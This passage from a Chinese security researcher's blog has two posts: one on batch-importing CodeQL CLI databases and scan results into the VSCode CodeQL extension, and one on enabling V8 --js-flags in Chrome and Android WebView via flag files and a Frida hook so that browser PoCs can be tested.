]]></content>
      <categories>
        <category>阅读笔记</category>
      </categories>
      <tags>
        <tag>Bootloader</tag>
        <tag>TZ</tag>
      </tags>
  </entry>
  <entry>
    <title>批量运营CodeQL Cli扫描结果(简易版)</title>
    <url>/2023/05/11/%E6%89%B9%E9%87%8F%E8%BF%90%E8%90%A5CodeQL-Cli%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C-%E7%AE%80%E6%98%93%E7%89%88/</url>
    <content><![CDATA[<h2 id="背景-amp-目标"><a href="#背景-amp-目标" class="headerlink" title="背景&amp;目标"></a>背景&amp;目标</h2><p>​    <code>CodeQL Cli</code>适合批量做扫描，但是扫描结果并不适合直接做批量的运营，仅适合一些实锤的问题，对于一些还需要人工处理判断的结果就不太适合了(要看源码、调用上下文)；如果使用<code>VSCode</code>插件来做，也只是单条规则扫单个/多个数据库，结果倒是很友好，点点点就能读代码来分析了，所以这种用法不适合批量的<code>query</code>扫描。</p>
<p>​    如果付费的话自然是可以解决了，可以在<code>CI/CD</code>中集成，就方便多了 -。- 但是对于个人使用者来说不太现实，所以我就想用一个简单的办法来实现这个目的</p>
<p><code>CodeQL cli</code>批量扫描结束后，导入数据库+历史<code>query</code>结果，直接在<code>vscode</code>里运营结果，流程为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CI/CD 扫描 ---&gt; 结果(数据库+扫描结果) ---&gt; 导入VSCode运营</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>目标拆解</p>
<ol>
<li> 批量导入数据库，而不是通过<code>GUI</code>点点点导入</li>
<li> 导入扫描结果，历史<code>query</code>不要清理，为的是把<code>cli</code>的扫描结果导入对应目录之后可以直接在<code>CodeQL</code>的<code>query history</code>中看到</li>
</ol>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><h3 id="批量导入数据库"><a href="#批量导入数据库" class="headerlink" title="批量导入数据库"></a>批量导入数据库</h3><p>查看日志，猜测是类似的做法，解析某个配置文件，然后导入，所以要么修改文件，要么直接把数据库目录<code>copy</code>过去就行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Initializing database manager.</span><br><span class="line">Found 1 persisted databases: file:///home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48</span><br><span class="line">Initializing database panel.</span><br><span class="line">Initializing evaluator <span class="built_in">log</span> viewer.</span><br><span class="line">Initializing query <span class="built_in">history</span> manager.</span><br><span class="line">Initializing results panel interface</span><br></pre></td></tr></table></figure>

<p>存储位置</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * databases.ts</span></span><br><span class="line"><span class="comment"> * ------------</span></span><br><span class="line"><span class="comment"> * Managing state of what the current database is, and what other</span></span><br><span class="line"><span class="comment"> * databases have been recently selected.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The source of truth of the current state resides inside the</span></span><br><span class="line"><span class="comment"> * `DatabaseManager` class below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the key in the workspaceState dictionary in which we</span></span><br><span class="line"><span class="comment"> * persist the current database across sessions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> CURRENT_DB = <span class="string">&quot;currentDatabase&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the key in the workspaceState dictionary in which we</span></span><br><span class="line"><span class="comment"> * persist the list of databases across sessions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> DB_LIST = <span class="string">&quot;databaseList&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>导出信息就能看到了，所以直接改数据库就能添加多个数据库了</p>
<p><code>/home/muhe/.config/Code/User/workspaceStorage/693bdf324f8bd69cec87e06d65e8d000/state.vscdb</code> </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;databaseList&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;uri&quot;</span>: <span class="string">&quot;file:///home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;ignoreSourceArchive&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">&quot;dateAdded&quot;</span>: <span class="number">1684233047172</span>,</span><br><span class="line">                <span class="attr">&quot;language&quot;</span>: <span class="string">&quot;cpp&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;currentDatabase&quot;</span>: <span class="string">&quot;file:///home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试直接修改这个数据库 就可以批量导入了，不需要挨个点点点了 :) </p>
<h3 id="导入扫描结果"><a href="#导入扫描结果" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h3><h4 id="query-history"><a href="#query-history" class="headerlink" title="query-history"></a><code>query-history</code></h4><p>扫描结果的导入是有个json文件描述的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Reading query <span class="built_in">history</span></span><br><span class="line">Reading cached query <span class="built_in">history</span> from <span class="string">&#x27;/home/muhe/.config/Code/User/workspaceStorage/693bdf324f8bd69cec87e06d65e8d000/GitHub.vscode-codeql/workspace-query-history.json&#x27;</span>.</span><br><span class="line">Successfully finished extension initialization.</span><br><span class="line">CodeQL extension version: 1.8.4 </span><br><span class="line">CodeQL CLI version: 2.13.1 </span><br><span class="line">Platform: linux x64</span><br></pre></td></tr></table></figure>

<p>我这里随意跑了两个Query，查看这个文件可以看到这两次记录:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">&quot;queries&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;initialInfo&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;queryText&quot;</span>: <span class="string">&quot;/**\n * @name Empty block\n * @kind problem\n * @problem.severity warning\n * @id cpp/example/empty-block\n */\n\nimport cpp\n \nfrom BlockStmt b\nwhere b.getNumStmt() = 0\nselect b, \&quot;This is an empty block.\&quot;\n&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;isQuickQuery&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;isQuickEval&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;queryPath&quot;</span>: <span class="string">&quot;/home/muhe/Tools/vscode-codeql-starter/codeql-custom-queries-cpp/example.ql&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;databaseInfo&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;databaseUri&quot;</span>: <span class="string">&quot;file:///home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;XNU-revision-2018-October-28--14-31-48&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;2023-05-16T10:44:25.321Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;example.ql-g8Dji9oz8xqxh-XoF96jF&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;t&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;evalLogLocation&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-DQ3x1MPMGzVEtt7SAYjJ9/evaluator-log.jsonl&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;evalLogSummaryLocation&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-DQ3x1MPMGzVEtt7SAYjJ9/evaluator-log.summary&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;completedQuery&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;querySaveDir&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-DQ3x1MPMGzVEtt7SAYjJ9&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;dbItemPath&quot;</span>: <span class="string">&quot;/home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;databaseHasMetadataFile&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Empty block&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;problem&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;problem.severity&quot;</span>: <span class="string">&quot;warning&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;cpp/example/empty-block&quot;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">&quot;resultsPaths&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;resultsPath&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-DQ3x1MPMGzVEtt7SAYjJ9/results.bqrs&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;interpretedResultsPath&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-DQ3x1MPMGzVEtt7SAYjJ9/interpretedResults.sarif&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;result&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;runId&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;queryId&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;resultType&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;evaluationTime&quot;</span>: <span class="number">11424</span>,</span><br><span class="line">          <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;finished in 11 seconds&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;successful&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;finished in 11 seconds&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;resultCount&quot;</span>: <span class="number">1461</span>,</span><br><span class="line">        <span class="attr">&quot;sortedResultsInfo&quot;</span>: &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;initialInfo&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;queryText&quot;</span>: <span class="string">&quot;/**\n * @name Empty block\n * @kind problem\n * @problem.severity warning\n * @id cpp/example/empty-block\n */\n\nimport cpp\n \nfrom BlockStmt b\nwhere b.getNumStmt() = 0\nselect b, \&quot;This is an empty block.\&quot;\n&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;isQuickQuery&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;isQuickEval&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;queryPath&quot;</span>: <span class="string">&quot;/home/muhe/Tools/vscode-codeql-starter/codeql-custom-queries-cpp/example.ql&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;databaseInfo&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;databaseUri&quot;</span>: <span class="string">&quot;file:///home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;XNU-revision-2018-October-28--14-31-48&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;2023-05-16T10:45:23.082Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;example.ql-2I3wLwL9OlUi_h2VbLFuj&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;t&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;evalLogLocation&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-tPeM-xPnZG3MkZC0duLSE/evaluator-log.jsonl&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;evalLogSummaryLocation&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-tPeM-xPnZG3MkZC0duLSE/evaluator-log.summary&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;completedQuery&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;querySaveDir&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-tPeM-xPnZG3MkZC0duLSE&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;dbItemPath&quot;</span>: <span class="string">&quot;/home/muhe/Work/codeql_multi_work/XNU-revision-2018-October-28--14-31-48&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;databaseHasMetadataFile&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Empty block&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;problem&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;problem.severity&quot;</span>: <span class="string">&quot;warning&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;cpp/example/empty-block&quot;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">&quot;resultsPaths&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;resultsPath&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-tPeM-xPnZG3MkZC0duLSE/results.bqrs&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;interpretedResultsPath&quot;</span>: <span class="string">&quot;/home/muhe/.config/Code/User/globalStorage/github.vscode-codeql/queries/example.ql-tPeM-xPnZG3MkZC0duLSE/interpretedResults.sarif&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;result&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;runId&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;queryId&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;resultType&quot;</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">&quot;evaluationTime&quot;</span>: <span class="number">31</span>,</span><br><span class="line">          <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;finished in 0 seconds&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;successful&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;finished in 0 seconds&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;resultCount&quot;</span>: <span class="number">1461</span>,</span><br><span class="line">        <span class="attr">&quot;sortedResultsInfo&quot;</span>: &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以把query结果按照这个格式填进去就行了。</p>
<h4 id="配置文件中需要的CodeQL-cli信息获取"><a href="#配置文件中需要的CodeQL-cli信息获取" class="headerlink" title="配置文件中需要的CodeQL cli信息获取"></a>配置文件中需要的CodeQL cli信息获取</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ tree -L 1 .</span><br><span class="line">.</span><br><span class="line">├── evaluator-log-end.summary</span><br><span class="line">├── evaluator-log.jsonl</span><br><span class="line">├── evaluator-log.summary</span><br><span class="line">├── evaluator-log.summary.map</span><br><span class="line">├── interpretedResults.sarif</span><br><span class="line">├── query.log</span><br><span class="line">├── results.bqrs</span><br><span class="line">├── results.dil</span><br><span class="line">└── timestamp</span><br></pre></td></tr></table></figure>



<p>经过测试，<strong>运营只需要扫描结果就行</strong>，其他的可以忽略</p>
<ul>
<li>  Evaluator Log 相关可以不要</li>
<li>  DIL 也可以不要，可以用于query调优啥的，我们只运营结果就不考虑了</li>
</ul>
<p>FYI: 其他的文件(log、dil等)是为了下面菜单中展示的功能做的：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20230516184801557.png" alt="image-20230516184801557"></p>
<h2 id="批量query-amp-导入结果分析"><a href="#批量query-amp-导入结果分析" class="headerlink" title="批量query &amp; 导入结果分析"></a>批量query &amp; 导入结果分析</h2><blockquote>
<p>   一般来说，我们会使用到开源的规则以及自己写的规则，如果有一定的积累的话，自己的规则可以搞成一个qlpack，方便后面对新目标的快速分析或者批量查找问题。</p>
</blockquote>
<h3 id="通用规则-开源规则"><a href="#通用规则-开源规则" class="headerlink" title="通用规则/开源规则"></a>通用规则/开源规则</h3><p>第一种情况，可以利用下面的命令，批量跑特定的规则集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-NUC11PAHi5 in ~/Tools/vscode-codeql-starter/ql/cpp/ql/src/codeql-suites on git:codeql-cli/latest o [18:53:36]</span></span><br><span class="line">$ tree -L 1 .</span><br><span class="line">.</span><br><span class="line">|-- cpp-code-scanning.qls</span><br><span class="line">|-- cpp-lgtm-full.qls</span><br><span class="line">|-- cpp-lgtm.qls</span><br><span class="line">|-- cpp-security-and-quality.qls</span><br><span class="line">|-- cpp-security-experimental.qls</span><br><span class="line">|-- cpp-security-extended.qls</span><br><span class="line">`-- exclude-slow-queries.yml</span><br><span class="line"></span><br><span class="line">0 directories, 7 files</span><br></pre></td></tr></table></figure>

<p>比如我们尝试使用<code>cpp-security-and-quality.qls</code>这个规则集跑老版本的XNU作为演示</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">codeql database run-queries --ram=<span class="number">16384</span> --threads=<span class="number">12</span> XNU-revision<span class="number">-2018</span>-October<span class="number">-28</span>-<span class="number">-14</span><span class="number">-31</span><span class="number">-48</span>  --min-disk-free=<span class="number">1024</span> -v ~/Tools/vscode-codeql-starter/ql/cpp/ql/src/codeql-suites/cpp-security-and-quality.qls</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20230516191008453.png" alt="image-20230516191008453"></p>
<p>FYI: 可以使用 <code>codeql resolve queries ~/Tools/vscode-codeql-starter/ql/cpp/ql/src/codeql-suites/cpp-security-and-quality.qls --format=text</code> 获取这个规则集包含了哪些query</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20230516185953628.png" alt="image-20230516185953628"></p>
<h3 id="特有规则"><a href="#特有规则" class="headerlink" title="特有规则"></a>特有规则</h3><p>第二种就使用规则仓库中PICO的pack就行，或者直接指定一个qls扫，就是类似的做法了，比如可以自己搞一个qlpack：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database run-queries --ram=16384 --threads=8  --min-disk-free=1024  -- [database] [qlpack]</span><br></pre></td></tr></table></figure>



<h3 id="结果处理"><a href="#结果处理" class="headerlink" title="结果处理"></a>结果处理</h3><p>对于这种跑query的方式，如果不指定输出，默认结果会放在数据库的 <code>results</code>目录下，比如:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20230516191056186.png" alt="image-20230516191056186"></p>
<p>所以可以写个脚本</p>
<ul>
<li>  修改<code>state.vscdb</code>，批量把<code>codeql db</code>导入</li>
<li>  修改<code>query-history</code>文件，把扫描结果导入</li>
</ul>
<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>最终实现的效果如下 :) </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20230516195840932.png" alt="image-20230516195840932"></p>
<p>FYI: 两个关键文件的路径不同平台下大同小异:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;macOS&#x27;</span> <span class="keyword">in</span> current_platform:</span><br><span class="line">    globalStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;HOME&quot;</span>)&#125;</span>/Library/Application Support/Code/User/globalStorage&#x27;</span></span><br><span class="line">    workspaceStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;HOME&quot;</span>)&#125;</span>/Library/Application Support/Code/User/workspaceStorage&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Linux&#x27;</span> <span class="keyword">in</span> current_platform:</span><br><span class="line">    globalStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;HOME&quot;</span>)&#125;</span>/.config/Code/User/globalStorage&#x27;</span></span><br><span class="line">    workspaceStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;HOME&quot;</span>)&#125;</span>/.config/Code/User/workspaceStorage&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Windows&#x27;</span> <span class="keyword">in</span> current_platform:</span><br><span class="line">    globalStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;APPDATA&quot;</span>)&#125;</span>\\Code\\User\\globalStorage&#x27;</span></span><br><span class="line">    workspaceStorage = <span class="string">f&#x27;<span class="subst">&#123;os.getenv(<span class="string">&quot;APPDATA&quot;</span>)&#125;</span>\\Code\\User\\workspaceStorage&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># error</span></span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p>  <a href="https://docs.github.com/en/code-security/codeql-cli/using-the-codeql-cli/analyzing-databases-with-the-codeql-cli#running-codeql-database-analyze">Analyzing databases with the CodeQL CLI</a></p>
</li>
<li><p>  <a href="https://docs.github.com/en/code-security/codeql-cli/codeql-cli-reference/about-codeql-packs">About CodeQL packs</a></p>
</li>
<li><p>  <a href="https://sumsec.me/2022/CodeQL-Usage-Tricks.html">CodeQl Usage Tricks</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Chromium based browser/Webview启用--js-flags</title>
    <url>/2023/09/08/Chromium-based-browser-Webview%E5%90%AF%E7%94%A8-js-flags/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>因为工作需求要去验证一些PoC，而很多PoC需要开natives-syntax才能跑，如果转成纯JS实现又需要花更多时间，所以需要在Android的app/webview里也实现添加 js-flags，方便后面搞分析 :)</p>
<span id="more"></span>

<h1 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h1><p>PC上比较简单没啥好说的，直接命令行传递参数就行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">./chrome --js-flags=<span class="string">&quot;--allow-natives-syntax&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>相关的代码，可以知道参数配置的文件相关情况</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/20230908174150.png" alt="image.png"></p>
<p>具体的操作步骤:</p>
<ol>
<li><p>chrome://flags里开启<code>Enable command line on non-rooted devices</code></p>
</li>
<li><p>把启动参数写到 /data/local/tmp 下，文件名固定</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;chrome --js-flags=\&quot;--expose-gc --allow-natives-syntax\&quot;&quot;</span> &gt; /data/<span class="built_in">local</span>/tmp/chrome-command-line</span><br></pre></td></tr></table></figure>

<p><img src="https://bytedance.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY2MTBjYzc2YWQzY2M1YWQ5MjFlYmUzZGFhMTUxMDBfZFhwTmgyOUVrTkwzb3o2Tk5WWnpNeGRqRGlra3o2a1VfVG9rZW46SlBUaGJqS3VPb2NBQ0F4ZUJHcGN3Y1JvbkNoXzE2OTQxNjYwNDY6MTY5NDE2OTY0Nl9WNA"></p>
<p>然后就可以验证PoC了<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/20230908174211.png" alt="image.png"></p>
<h1 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h1><h2 id="系统webview"><a href="#系统webview" class="headerlink" title="系统webview"></a>系统webview</h2><p><a href="https://developer.android.com/develop/ui/views/layout/webapps/debugging#java">https://developer.android.com/develop/ui/views/layout/webapps/debugging#java</a></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/20230908174224.png" alt="image.png"></p>
<p>主要是依赖这个 DevTools来做的，参考:<a href="https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/developer-ui.md">https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/developer-ui.md</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am start -a <span class="string">&quot;com.android.webview.SHOW_DEV_UI&quot;</span></span><br></pre></td></tr></table></figure>

<p>这样看到的flags配置，并没有开启命令行选项的配置，这个和浏览器不太一样，参考：</p>
<p><a href="https://chromium.googlesource.cm/chromium/src/+/HEAD/android_webview/docs/commandline-flags.md">https://chromium.googlesource.cm/chromium/src/+/HEAD/android_webview/docs/commandline-flags.md</a></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/20230908174236.png" alt="image.png"></p>
<p>文件路径是 <code>/data/local/tmp/webview-command-line</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">FLAG_FILE=/data/local/tmp/webview-command-line</span><br><span class="line"># Overwrite <span class="built_in">flags</span> (supports multiple). The first token is ignored. We use <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="meta"># as a convenient placeholder, but any token is acceptable.</span></span><br><span class="line">adb shell <span class="string">&quot;echo &#x27;_ --highlight-all-webviews --force-enable-metrics-reporting&#x27; &gt; $&#123;FLAG_FILE&#125;&quot;</span></span><br><span class="line"># Clear flags</span><br><span class="line">adb shell <span class="string">&quot;rm $&#123;FLAG_FILE&#125;&quot;</span></span><br><span class="line"># Print flags</span><br><span class="line">adb shell <span class="string">&quot;cat $&#123;FLAG_FILE&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>这样不太行，所以考虑直接frida hook，要注意因为加载目标类在webview的dex中，所以需要遍历classloader找到对应的classloader去钩目标类</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.enumerateClassLoaders(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">loader</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(loader.findClass(<span class="string">&quot;org.chromium.base.CommandLine&quot;</span>))&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;[+]Successfully found loader&quot;</span>)</span><br><span class="line">                    <span class="built_in">console</span>.log(loader);</span><br><span class="line">                    Java.classFactory.loader = loader;</span><br><span class="line">                    <span class="keyword">let</span> CommandLine = Java.use(<span class="string">&quot;org.chromium.base.CommandLine&quot;</span>);</span><br><span class="line">                    CommandLine.nativeInit.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">                                <span class="built_in">this</span>.nativeInit(...args);</span><br><span class="line">                                <span class="built_in">this</span>.nativeAppendSwitchWithValue(<span class="string">&quot;--js-flags&quot;</span>, <span class="string">&quot;--allow-natives-syntax&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;[!]Find error:&quot;</span> + error)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[+]onComplete&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>完整脚本:  <a href="https://gist.github.com/o0xmuhe/98299328206820d2c55a7f44d300cdc0">https://gist.github.com/o0xmuhe/98299328206820d2c55a7f44d300cdc0</a></p>
